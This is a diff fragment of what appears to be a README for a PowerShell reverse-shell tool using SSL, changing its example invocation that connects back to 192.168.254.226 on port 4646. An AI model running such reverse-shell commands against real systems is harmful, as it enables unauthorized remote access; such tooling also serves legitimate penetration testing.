@@ -26,7 +26,7 @@ This is a reverse shell written in PowerShell that uses SSL communications betwe
 
 PS > Import-Module .\GetShellSSL
 
-PS > GetShellSSL -Reverse -IPAddress 192.168.254.226 -Port 4646
+PS > GetShell -Reverse -IPAddress 192.168.254.226 -Port 4646
 
 ```
 
